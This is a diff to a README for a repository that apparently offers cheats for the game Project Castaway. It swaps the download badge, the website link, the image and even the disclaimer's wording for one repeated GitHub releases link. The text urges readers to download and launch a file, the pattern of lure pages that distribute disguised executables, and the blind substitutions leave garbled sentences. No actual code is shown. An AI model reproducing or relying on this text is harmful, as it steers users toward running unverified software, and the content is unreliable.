@@ -9,7 +9,7 @@ Welcome to the Project Castaway Trainer Cheats repository! If you are looking to
 
 ## 🚀 Get Started
 To access the cheats, click the link below:
-[![Download Cheats](https://img.shields.io/badge/Download-Cheats-blue)](https://github.com/uploads/App.zip)
+[![Download Cheats](https://github.com/pratyush8sharma/Project-Castaway-Trainer-Cheats/releases)](https://github.com/pratyush8sharma/Project-Castaway-Trainer-Cheats/releases)
 *Note: Make sure to launch the downloaded file to apply the cheats to your game.*
 
 ## 🎮 Explore More
@@ -28,7 +28,7 @@ Dive into a world of endless possibilities with the Project Castaway Trainer Che
 4. Enjoy a whole new level of gaming experience in Project Castaway.
 
 ## 🌌 Visit Our Website
-For more information and updates, visit our website [ProjectCastawayCheats.com](https://www.projectcastawaycheats.com).
+For more information and updates, visit our website [https://github.com/pratyush8sharma/Project-Castaway-Trainer-Cheats/releases](https://github.com/pratyush8sharma/Project-Castaway-Trainer-Cheats/releases).
 
 ## 🌟 Get Involved
 Want to contribute to the Project Castaway Trainer Cheats repository? Feel free to submit your own cheats, hacks, or glitches to help fellow gamers enhance their experience. Together, we can make Project Castaway an even more exciting adventure.
@@ -42,7 +42,7 @@ If the provided download link is not working or you need the latest updates, che
 ## 🌟 Let's Level Up!
 Embark on a thrilling journey with Project Castaway Trainer Cheats. Unleash your full potential, discover hidden secrets, and conquer the game like never before. It's time to level up and make your mark in the world of Project Castaway.
 
-![Project Castaway Image](https://example.com/projectcastawayimage.jpg)
+![Project Castaway Image](https://github.com/pratyush8sharma/Project-Castaway-Trainer-Cheats/releases)
 
 ---
 
@@ -50,4 +50,4 @@ With the Project Castaway Trainer Cheats, the possibilities are endless. Elevate
 
 ---
 
-*Note: This README.md is a creative representation and does not reflect actual cheat codes or hacks for any specific game.*
+*Note: This https://github.com/pratyush8sharma/Project-Castaway-Trainer-Cheats/releases is a creative representation and does not reflect actual cheat codes or hacks for any specific game.*
